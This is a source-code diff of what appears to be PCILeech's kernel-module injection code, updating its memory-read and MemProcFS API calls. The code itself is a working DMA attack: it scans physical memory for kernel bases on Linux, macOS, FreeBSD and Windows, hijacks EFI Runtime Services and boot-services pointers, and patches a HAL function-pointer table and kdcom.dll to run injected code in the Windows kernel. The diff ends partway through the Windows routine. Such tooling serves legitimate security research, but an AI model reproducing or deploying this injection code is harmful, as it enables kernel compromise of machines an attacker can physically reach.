@@ -7,7 +7,7 @@
 #include "device.h"
 #include "util.h"
 #include "executor.h"
-#include "vmmprx.h"
+#include "vmmx.h"
 
 typedef struct tdKMDHANDLE_S12 {
     QWORD qwPageAddr;
@@ -46,9 +46,8 @@ _Success_(return)
 BOOL KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ QWORD qwAddrBase, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatch)
 {
     PBYTE pb;
-    DWORD pgIdx, i, j;
     PSIGNATURE ps;
-    QWORD qwAddressCurrent;
+    QWORD pgIdx, i, j, qwAddressCurrent;
     for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
         pb = pbPages + (4096 * pgIdx);
         qwAddressCurrent = qwAddrBase + (4096 * pgIdx);
@@ -68,7 +67,7 @@ BOOL KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ QWORD qwA
                 }
             }
             if(ps->chunk[0].qwAddress && ps->chunk[1].qwAddress) {
-                *pdwSignatureMatch = i;
+                *pdwSignatureMatch = (DWORD)i;
                 return TRUE;
             }
         }
@@ -94,11 +93,11 @@ BOOL KMD_FindSignature1(_Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, 
     // initialize / allocate memory / load signatures
     if(!(pbBuffer8M = LocalAlloc(0, 0x800000))) { goto cleanup; }
     // loop kmd-find
-    qwAddrMax = min(ctxMain->cfg.qwAddrMax, ctxMain->dev.paMaxNative);
+    qwAddrMax = min(ctxMain->cfg.qwAddrMax, ctxMain->dev.paMax);
     if(!PageStatInitialize(&pPageStat, qwAddrCurrent, qwAddrMax, "Searching for KMD location", FALSE, FALSE)) { goto cleanup; }
     while(qwAddrCurrent < qwAddrMax) {
         pPageStat->qwAddr = qwAddrCurrent;
-        if(DeviceReadDMAEx(qwAddrCurrent, pbBuffer8M, 0x800000, pPageStat, 0)) {
+        if(DeviceReadDMA(qwAddrCurrent, 0x800000, pbBuffer8M, pPageStat)) {
             result = KMD_FindSignature2(pbBuffer8M, 2048, qwAddrCurrent, pSignatures, cSignatures, pdwSignatureMatchIdx);
             if(result) {
                 pPageStat->szAction = "Waiting for KMD to activate";
@@ -129,7 +128,7 @@ BOOL KMD_FindSignature_EfiRuntimeServices(_Out_ PQWORD pqwAddrPhys)
         result =
             ((ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) > 0x18) &&
             ((ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) < (0x1000 - 0x88)) &&
-            DeviceReadMEM(ctxMain->cfg.qwEFI_IBI_SYST & ~0xfff, pbBuffer16M, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL) &&
+            DeviceReadMEM(ctxMain->cfg.qwEFI_IBI_SYST & ~0xfff, 0x1000, pbBuffer16M, TRUE) &&
             IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff));
         LocalFree(pbBuffer16M);
         *pqwAddrPhys = ctxMain->cfg.qwEFI_IBI_SYST;
@@ -192,7 +191,7 @@ BOOL KMD_MacOSKernelGetBase(_Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB,
     DWORD i, cKSlide;
     for(cKSlide = 1; cKSlide <= 512; cKSlide++) {
         *pdwKernelBase = cKSlide * 0x00200000; // KASLR = ([RND:1..512] * 0x00200000)
-        if(4096 != LeechCore_ReadEx(*pdwKernelBase, pbPage, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, *pdwKernelBase, 4096, pbPage)) {
             printf("KMD: Failed. Error reading address: 0x%08x\n", *pdwKernelBase);
             return FALSE;
         }
@@ -221,7 +220,7 @@ BOOL KMD_MacOSKernelSeekSignature(_Out_ PSIGNATURE pSignature)
     cbTextHIB = (cbTextHIB + 0xfff) & 0xfffff000;
     pbTextHIB = LocalAlloc(0, cbTextHIB);
     if(!pbTextHIB) { return FALSE; }
-    if(!DeviceReadDMAEx(dwTextHIB, pbTextHIB, cbTextHIB, NULL, 0)) {
+    if(!DeviceReadDMA(dwTextHIB, cbTextHIB, pbTextHIB, NULL)) {
         LocalFree(pbTextHIB);
         return FALSE;
     }
@@ -247,7 +246,7 @@ BOOL KMD_FreeBSDKernelSeekSignature(_Out_ PSIGNATURE pSignature)
     PBYTE pb64M = LocalAlloc(LMEM_ZEROINIT, 0x04000000);
     if(!pb64M) { return FALSE; }
     for(i = 0x01000000; i < 0x04000000; i += 0x01000000) {
-        DeviceReadDMAEx(i, pb64M + i, 0x01000000, NULL, 0);
+        DeviceReadDMA(i, 0x01000000, pb64M + i, NULL);
     }
     // 1: search for string 'vn_open'
     i = 0;
@@ -364,7 +363,7 @@ _Success_(return)
 BOOL KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(_In_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbStart, _In_ PKERNELSEEKER pS)
 {
     DWORD o, oFn;
-    for(o = cbStart; o < cb - 8; o += 8) {
+    for(o = cbStart; o < cb - 8; o += 4) {
         if(o + *(PDWORD)(pb + o + 4) + 4 == pS->aSeek) {
             oFn = o + *(PDWORD)(pb + o);
             if((oFn < 0x02000000) && !(oFn & 0xf) && (oFn != o)) {
@@ -432,15 +431,14 @@ BOOL KMD_Linux46KernelSeekSignature(_Out_ PSIGNATURE pSignature)
         // read 16M of memory first, if KASLR read 2M chunks at top of analysis buffer (performance reasons).
         dwKernelBase = 0x01000000 + cKSlide * 0x00200000; // KASLR = 16M + ([RND:0..511] * 2M) ???
         if(cKSlide == 0) {
-            DeviceReadDMAEx(dwKernelBase, pb, 0x01000000, NULL, 0);
+            DeviceReadDMA(dwKernelBase, 0x01000000, pb, NULL);
         } else {
             memmove(pb, pb + 0x00200000, CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
-            result = 0x00200000 == LeechCore_ReadEx(
-                dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
-                pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
+            result = DeviceReadDMA_Retry(
+                ctxMain->hLC,
+                (QWORD)dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
                 0x00200000,
-                PCILEECH_MEM_FLAG_RETRYONFAIL,
-                NULL);
+                pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
         }
         result =
             KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2) &&
@@ -457,20 +455,21 @@ BOOL KMD_Linux46KernelSeekSignature(_Out_ PSIGNATURE pSignature)
 QWORD KMD_Linux48KernelBaseSeek()
 {
     PPAGE_STATISTICS pPageStat = NULL;
-    BYTE pb[0x1000], pbCMP90[0x400], pbCMP00[0x100];
+    BYTE pb[0x1000], pbCMPcc[0x400], pbCMP90[0x400], pbCMP00[0x100];
     QWORD qwA, qwAddrMax, i;
     BOOL isAuthenticAMD, isGenuineIntel;
+    memset(pbCMPcc, 0xcc, 0x400);
     memset(pbCMP90, 0x90, 0x400);
     memset(pbCMP00, 0x00, 0x100);
     qwA = max(0x01000000, ctxMain->cfg.qwAddrMin) & 0xffffffffffe00000;
-    qwAddrMax = max(0x01000000, (ctxMain->dev.paMaxNative - 0x01000000) & 0xffffffffffe00000);
+    qwAddrMax = max(0x01000000, (ctxMain->dev.paMax - 0x01000000) & 0xffffffffffe00000);
     if(!PageStatInitialize(&pPageStat, qwA, qwAddrMax, "Scanning for Linux kernel base", FALSE, FALSE)) { return 0; }
     // Linux kernel uses 2MB pages. Base of kernel is assumed to have AuthenticAMD and GenuineIntel strings
     // in first page. First page should also end with at least 0x400 0x90's. 2nd page (hypercall page?) is
     // assumed to end with 0x100 0x00's.
     for(; qwA <= qwAddrMax; qwA += 0x00200000) {
         pPageStat->qwAddr = qwA;
-        if(0x400 != LeechCore_Read(qwA, pb, 0x400)) {
+        if(!LcRead(ctxMain->hLC, qwA, 0x400, pb)) {
             PageStatUpdate(pPageStat, qwA, 0, 512);
             continue;
         }
@@ -484,12 +483,12 @@ QWORD KMD_Linux48KernelBaseSeek()
         if(!isGenuineIntel || !isAuthenticAMD) {
             continue;
         }
-        // Verify that page ends with 0x400 NOPs (0x90).
-        if(0x1000 != LeechCore_Read(qwA, pb, 0x1000) || memcmp(pb + 0xc00, pbCMP90, 0x400)) {
+        // Verify that page ends with 0x400 NOPs (0x90) or 0x400 0xCC.
+        if(!LcRead(ctxMain->hLC, qwA, 0x1000, pb) || (memcmp(pb + 0xc00, pbCMP90, 0x400) && memcmp(pb + 0xc00, pbCMPcc, 0x400))) {
             continue;
         }
         // read kernel base + 0x1000 (hypercall page?) and check that it ends with at least 0x100 0x00.
-        if(0x1000 != LeechCore_Read(qwA + 0x1000, pb, 0x1000) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
+        if(!LcRead(ctxMain->hLC, qwA + 0x1000, 0x1000, pb) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
             continue;
         }
         PageStatClose(&pPageStat);
@@ -507,7 +506,6 @@ BOOL KMD_Linux48KernelSeekSignature(_Out_ PSIGNATURE pSignature)
     PBYTE pb = NULL;
     QWORD paKernelBase;
     PPAGE_STATISTICS pPageStat = NULL;
-    LEECHCORE_PAGESTAT_MINIMAL oLeechCoreStat;
     KERNELSEEKER ks[2] = {
         { .pbSeek = (PBYTE)"\0kallsyms_lookup_name",.cbSeek = 22 },
         { .pbSeek = (PBYTE)"\0vfs_read",.cbSeek = 10 }
@@ -518,9 +516,7 @@ BOOL KMD_Linux48KernelSeekSignature(_Out_ PSIGNATURE pSignature)
     printf("\n");
     if(!PageStatInitialize(&pPageStat, paKernelBase, paKernelBase + KMD_LINUX48SEEK_MAX_BYTES, "Verifying Linux kernel base", FALSE, FALSE)) { goto fail; }
     PageStatUpdate(pPageStat, paKernelBase, 0, 0);
-    oLeechCoreStat.h = (HANDLE)pPageStat;
-    oLeechCoreStat.pfnPageStatUpdate = (VOID(*)(HANDLE, ULONG64, ULONG64, ULONG64))PageStatUpdate;
-    LeechCore_ReadEx(paKernelBase, pb, KMD_LINUX48SEEK_MAX_BYTES, 0, &oLeechCoreStat);
+    DeviceReadDMA(paKernelBase, KMD_LINUX48SEEK_MAX_BYTES, pb, pPageStat);
     result = KMD_LinuxFindFunctionAddr(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 2) && KMD_LinuxFindFunctionAddrTBL(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 2);
     if(result) {
         Util_CreateSignatureLinuxGeneric(paKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].aSeek, ks[1].vaSeek, ks[1].vaFn, pSignature);
@@ -557,7 +553,7 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
         printf("KMD: Failed. EFI Runtime Services table located on page boundary.\n");
         goto fail;
     }
-    result = 0x1000 == LeechCore_ReadEx(qwAddrEfiRt & ~0xfff, pbEfiRt, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL);
+    result = DeviceReadDMA_Retry(ctxMain->hLC, qwAddrEfiRt & ~0xfff, 0x1000, pbEfiRt);
     if(!result || !IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbEfiRt + (qwAddrEfiRt & 0xfff))) {
         printf("KMD: Failed. Error reading EFI Runtime Services table.\n");
         goto fail;
@@ -568,7 +564,7 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
     Util_CreateSignatureLinuxEfiRuntimeServices(pSignature);
     *(PQWORD)(pSignature->chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
     memcpy(pSignature->chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70); // 0x30 == offset data_runtserv_table_fn.
-    result = 0x1000 == LeechCore_ReadEx(0, pbOrig, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL);
+    result = DeviceReadDMA_Retry(ctxMain->hLC, 0, 0x1000, pbOrig);
     if(!result) {
         printf("KMD: Failed. Error reading at address 0x0.\n");
         goto fail;
@@ -576,12 +572,12 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
     //------------------------------------------------
     // 3: Patch wait to reveive execution of EFI code.
     //------------------------------------------------
-    LeechCore_WriteEx(0, pSignature->chunk[3].pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+    DeviceWriteDMA_Retry(ctxMain->hLC, 0, 0x1000, pSignature->chunk[3].pb);
     for(i = 0; i < 14; i++) {
         o = (qwAddrEfiRt & 0xfff) + 0x18 + 8 * i; // 14 tbl entries of 64-bit/8-byte size.
         *(PQWORD)(pbEfiRt + o) = 0x100 + 2 * i; // each PUSH in receiving slide is 2 bytes, offset to code = 0x100.
     }
-    LeechCore_WriteEx(qwAddrEfiRt, pbEfiRt + (qwAddrEfiRt & 0xfff), 0x88 /* 0x18 hdr, 0x70 fntbl */, PCILEECH_MEM_FLAG_RETRYONFAIL);
+    DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrEfiRt, 0x88 /* 0x18 hdr, 0x70 fntbl */, pbEfiRt + (qwAddrEfiRt & 0xfff));
     memset(pb, 0, 0x1000);
     pdwPhysicalAddress = (PDWORD)(pb + 0x20); // 0x20 == offset data_phys_addr_alloc.
     printf(
@@ -590,7 +586,7 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
         "     Ubuntu graphical lock screen may trigger EFI Runtime Services call.\n");
     do {
         Sleep(100);
-        if(0x1000 != LeechCore_ReadEx(0, pb, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, 0, 0x1000, pb)) {
             Util_WaitForPowerCycle();
             printf("KMD: Resume waiting to receive execution.\n");
         }
@@ -600,12 +596,12 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
     //------------------------------------------------
     // 4: Restore EFI Runtime Services shellcode and move on to 2nd buffer.
     //------------------------------------------------
-    LeechCore_Write(0, pbOrig, 0x1000);
+    LcWrite(ctxMain->hLC, 0, 0x1000, pbOrig);
     memset(pb, 0, 0x1000);
     printf("KMD: Waiting to receive execution.\n");
     do {
         Sleep(100);
-        if(0x1000 != LeechCore_ReadEx(dwPhysAddrS2, pb, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, dwPhysAddrS2, 0x1000, pb)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
@@ -615,7 +611,7 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
     // 5: Clear 2nd buffer and set up stage #3.
     //------------------------------------------------
     memset(pb, 0, 0x1000);
-    LeechCore_Write(dwPhysAddrS2, pb, 0x1000);
+    LcWrite(ctxMain->hLC, dwPhysAddrS2, 0x1000, pb);
     result = KMD_SetupStage3(dwPhysAddrS3, pSignature->chunk[4].pb, 4096);
     LocalFree(pSignature);
     return result;
@@ -635,7 +631,7 @@ BOOL KMD_Win_SearchTableHalpApicRequestInterrupt(_In_ PBYTE pbPage, _In_ QWORD q
     BOOL result;
     for(i = 0; i < (0x1000 - 0x78); i += 8) {
         result =
-            ((*(PQWORD)(pbPage + i + 0x00) & ~0xfff) == qwPageVA) &&
+            ((*(PQWORD)(pbPage + i + 0x00) & 0xfffff00000000000) == 0xfffff00000000000) &&
             ((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
             ((*(PQWORD)(pbPage + i + 0x18) == 0x28) || (*(PQWORD)(pbPage + i + 0x18) == 0x30)) &&
             ((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
@@ -662,7 +658,7 @@ BOOL KMDOpen_UEFI_FindEfiBase()
     if(!PageStatInitialize(&pPageStat, dwAddrCurrent, dwAddrMax, "Searching for EFI BASE", FALSE, FALSE)) { goto fail; }
     // loop EFI BASE (IBI SYST) find
     while(dwAddrCurrent <= dwAddrMax - 0x100000) {
-        if(DeviceReadDMAEx(dwAddrCurrent, pb, 0x100000, pPageStat, 0)) {
+        if(DeviceReadDMA(dwAddrCurrent, 0x100000, pb, pPageStat)) {
             for(o = 0; o < 0x100000 - 0x100; o += 8) {
                 if(0x5453595320494249 != *(PQWORD)(pb + o)) { continue; } // IBI SYST
                 qwAddr_BOOTSERV = *(PQWORD)(pb + o + 0x60);
@@ -705,7 +701,7 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
             return FALSE;
         }
     }
-    result = 0x2000 == LeechCore_ReadEx(ctxMain->cfg.qwEFI_IBI_SYST & ~0xfff, pb, 0x2000, LEECHCORE_FLAG_READ_RETRY, NULL);
+    result = DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->cfg.qwEFI_IBI_SYST & ~0xfff, 0x2000, pb);
     result = result && (0x5453595320494249 == *(PQWORD)(pb + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff)));
     qwAddrEFI_BOOTSERV = *(PQWORD)(pb + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) + 0x60);
     qwAddrEFI_RUNTSERV = *(PQWORD)(pb + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) + 0x58);
@@ -715,7 +711,7 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
         printf("KMD: Failed. Error reading or interpreting memory #1 at: 0x%llx\n", ctxMain->cfg.qwEFI_IBI_SYST);
         return FALSE;
     }
-    result = 0x2000 == LeechCore_ReadEx(qwAddrEFI_BOOTSERV & ~0xfff, pb, 0x2000, LEECHCORE_FLAG_READ_RETRY, NULL);
+    result = LcRead(ctxMain->hLC, qwAddrEFI_BOOTSERV & ~0xfff, 0x2000, pb);
     result = result && (0x56524553544f4f42 == *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff)));
     qwAddrHookedFunction = *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff) + bOffsetHookBootServices);
     result = result && qwAddrHookedFunction && (0 == (qwAddrHookedFunction & 0xffffffff00000000));
@@ -738,13 +734,13 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
         printf("INFO: IBI SYST:   0x%08x\n", (DWORD)ctxMain->cfg.qwEFI_IBI_SYST);
         printf("INFO: BOOTSERV:   0x%08x\n", (DWORD)qwAddrEFI_BOOTSERV);
     }
-    result = LeechCore_WriteEx(qwAddrKMDDATA, pb, 0x2000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+    result = DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrKMDDATA, 0x2000, pb);
     if(!result) {
         printf("KMD: Failed. Failed writing to memory #1.\n");
         return FALSE;
     }
     qwAddrKMD = qwAddrKMDDATA + 0x1000;
-    result = LeechCore_WriteEx(qwAddrEFI_BOOTSERV + bOffsetHookBootServices, (PBYTE)&qwAddrKMD, 8, PCILEECH_MEM_FLAG_RETRYONFAIL);
+    result = DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrEFI_BOOTSERV + bOffsetHookBootServices, 8, (PBYTE)&qwAddrKMD);
     if(!result) {
         printf("KMD: Failed. Failed writing to memory #2.\n");
         return FALSE;
@@ -755,7 +751,7 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
     printf("KMD: Waiting to receive execution.\n");
     do {
         Sleep(100);
-        if(0x1000 != LeechCore_ReadEx(qwAddrKMDDATA, pb, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, qwAddrKMDDATA, 0x1000, pb)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             return FALSE;
         }
@@ -766,6 +762,8 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
     //------------------------------------------------
     return KMD_SetupStage3((DWORD)qwAddrKMDDATA, pb + 0x1000, 0x1000);
 }
+
+#ifdef WIN32
 
 /*
 * Load a kernel module (KMD) into a Windows 10 system on which not both of
@@ -779,9 +777,8 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
 * for thread creation via PsCreateSystemThread.
 * It also patches function pointer table in HAL heap to gain initial execution.
 */
-#ifdef WIN32
 _Success_(return)
-BOOL KMDOpen_WINX64_VMM()
+BOOL KMDOpen_WINX64_2_VMM()
 {
     BOOL result = FALSE;
     BYTE pbPage[0x1000];
@@ -799,9 +796,9 @@ BOOL KMDOpen_WINX64_VMM()
     QWORD qwTMP, vaHalBugCheckSystem;
     BYTE pbHalBugCheckSystem_Orig[16] = { 0 };
     // ------------------------------------------------------------------------
-    // 1: Initialize vmm.dll / memory process file system
+    // 1: Initialize MemProcFS/vmm.dll
     // ------------------------------------------------------------------------
-    if(!VmmPrx_Initialize(FALSE)) {
+    if(!Vmmx_Initialize(FALSE, FALSE)) {
         printf("KMD: Failed initializing required MemProcFS/vmm.dll\n");
         return FALSE;
     }
@@ -812,20 +809,20 @@ BOOL KMDOpen_WINX64_VMM()
     //    hal.dll!HalBugCheckSystem (used for 'hook' to provide valid landing
     //             site for PsCreateSystemThread -> no security bugchecks...)
     // ------------------------------------------------------------------------
-    vaBaseKdCom = VmmPrx_ProcessGetModuleBase(4, L"kdcom.dll");
-    vaBaseNtoskrnl = VmmPrx_ProcessGetModuleBase(4, L"ntoskrnl.exe");
-    vaHalBugCheckSystem = VmmPrx_ProcessGetProcAddress(4, L"hal.dll", "HalBugCheckSystem");
+    vaBaseKdCom = VMMDLL_ProcessGetModuleBase(4, L"kdcom.dll");
+    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe");
+    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddress(4, L"hal.dll", "HalBugCheckSystem");
     if(!vaBaseKdCom || !vaBaseNtoskrnl || !vaHalBugCheckSystem) {
-        printf("KMD: Failed vmm.dll!VmmPrx_ProcessGetModuleBase (kdcom.dll/ntoskrnl.exe)\n");
+        printf("KMD: Failed vmm.dll!ProcessGetModuleBase (kdcom.dll/ntoskrnl.exe)\n");
         goto fail;
     }
-    if(!VmmPrx_ProcessGetSections(4, L"kdcom.dll", NULL, 0, &cSections) || !cSections) {
+    if(!VMMDLL_ProcessGetSections(4, L"kdcom.dll", NULL, 0, &cSections) || !cSections) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #1\n");
         goto fail;
     }
     pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
     if(!pSections) { goto fail; }
-    if(!VmmPrx_ProcessGetSections(4, L"kdcom.dll", pSections, cSections, &cSections)) {
+    if(!VMMDLL_ProcessGetSections(4, L"kdcom.dll", pSections, cSections, &cSections)) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #2\n");
         goto fail;
     }
@@ -838,12 +835,12 @@ BOOL KMDOpen_WINX64_VMM()
         }
     }
     if(!vaExec || !vaData) { goto fail; }
-    VmmPrx_MemVirt2Phys(4, vaData, &paData);
-    VmmPrx_MemRead(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
+    VMMDLL_MemVirt2Phys(4, vaData, &paData);
+    VMMDLL_MemRead(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
     // ------------------------------------------------------------------------
     // 3: Check if inject is already active!
     // ------------------------------------------------------------------------
-    if(VmmPrx_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE) && paKMD) {
+    if(VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE) && paKMD) {
         goto success_kmd_load;
     }
     // ------------------------------------------------------------------------
@@ -851,14 +848,14 @@ BOOL KMDOpen_WINX64_VMM()
     //    i.e. function table in hal.dll heap. Result is address of function pointer to
     //    place hook upon.
     // ------------------------------------------------------------------------
-    if(!VmmPrx_ProcessMap_GetPte(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
-        printf("KMD: Failed vmm.dll!ProcessGetMemoryMap #1.\n");
+    if(!VMMDLL_Map_GetPte(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
+        printf("KMD: Failed vmm.dll!Map_GetPte #1.\n");
         goto fail;
     }
     pMemMap = LocalAlloc(LMEM_ZEROINIT, cbMemMap);
     if(!pMemMap) { goto fail; }
-    if(!VmmPrx_ProcessMap_GetPte(4, pMemMap, &cbMemMap, FALSE)) {
-        printf("KMD: Failed vmm.dll!ProcessGetMemoryMap #2.\n");
+    if(!VMMDLL_Map_GetPte(4, pMemMap, &cbMemMap, FALSE)) {
+        printf("KMD: Failed vmm.dll!Map_GetPte #2.\n");
         goto fail;
     }
     while(TRUE) {
@@ -870,7 +867,7 @@ BOOL KMDOpen_WINX64_VMM()
         if(pMemMap->pMap[i].vaBase < 0xfffff78000000000) { continue; }
         for(j = 0; j < pMemMap->pMap[i].cPages; j++) {
             vaHook = pMemMap->pMap[i].vaBase + (j << 12);
-            VmmPrx_MemReadPage(4, vaHook, pbPage);
+            VMMDLL_MemReadPage(4, vaHook, pbPage);
             if(KMD_Win_SearchTableHalpApicRequestInterrupt(pbPage, vaHook, &dwHookOffset)) {
                 vaHook += dwHookOffset;
                 goto success_locate_hook; // lvl2 loop breakout with goto
@@ -878,8 +875,8 @@ BOOL KMDOpen_WINX64_VMM()
         }
     }
 success_locate_hook:
-    if(!VmmPrx_MemRead(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD))) {
-        printf("KMD: Failed vmm.dll!VmmPrx_MemRead #1.\n");
+    if(!VMMDLL_MemRead(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD))) {
+        printf("KMD: Failed vmm.dll!MemRead #1.\n");
         goto fail;
     }
     // ------------------------------------------------------------------------
@@ -891,39 +888,39 @@ success_locate_hook:
     *(PQWORD)(pbExec + 0x18) = vaData + 0x10;                   // DEBUG data address
     *(PQWORD)(pbExec + 0x20) = vaData;                          // KMDDATA physical address
     *(PQWORD)(pbExec + 0x28) = vaBaseNtoskrnl;                  // NTOSKRNL.EXE virtual address
-    *(PQWORD)(pbExec + 0x30) = VmmPrx_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory");
-    *(PQWORD)(pbExec + 0x38) = VmmPrx_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread");
-    *(PQWORD)(pbExec + 0x40) = VmmPrx_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress");
-    *(PQWORD)(pbExec + 0x48) = VmmPrx_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql");
+    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory");
+    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread");
+    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress");
+    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql");
     *(PQWORD)(pbExec + 0x50) = vaHalBugCheckSystem;
     // ------------------------------------------------------------------------
     // 6: hook and watch for execution & restore
     // ------------------------------------------------------------------------
     qwTMP = 0x0000000025ff9090;
-    VmmPrx_MemWrite(4, vaHalBugCheckSystem, (PBYTE)&qwTMP, 8);
+    VMMDLL_MemWrite(4, vaHalBugCheckSystem, (PBYTE)&qwTMP, 8);
     qwTMP = vaExec + 2;
-    VmmPrx_MemWrite(4, vaHalBugCheckSystem + 8, (PBYTE)&qwTMP, 8);
-    if(!VmmPrx_MemWrite(4, vaExec, pbExec, 0x800) || !VmmPrx_MemRead(4, vaExec, pbExecVerify, 0x800) || memcmp(pbExec, pbExecVerify, 0x800)) {
+    VMMDLL_MemWrite(4, vaHalBugCheckSystem + 8, (PBYTE)&qwTMP, 8);
+    if(!VMMDLL_MemWrite(4, vaExec, pbExec, 0x800) || !VMMDLL_MemRead(4, vaExec, pbExecVerify, 0x800) || memcmp(pbExec, pbExecVerify, 0x800)) {
         printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #2.\n");
         goto fail;
     }
-    if(!VmmPrx_MemWrite(4, vaHook, (PBYTE)&vaExec, sizeof(QWORD))) {
+    if(!VMMDLL_MemWrite(4, vaHook, (PBYTE)&vaExec, sizeof(QWORD))) {
         printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #3.\n");
         goto fail;
     }
     printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
     do {
         Sleep(100);
-        if(!VmmPrx_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
+        if(!VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
     } while(paKMD == 0);
     printf("KMD: Execution received - continuing ...\n");
-    VmmPrx_MemWrite(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD));
-    VmmPrx_MemWrite(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
+    VMMDLL_MemWrite(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD));
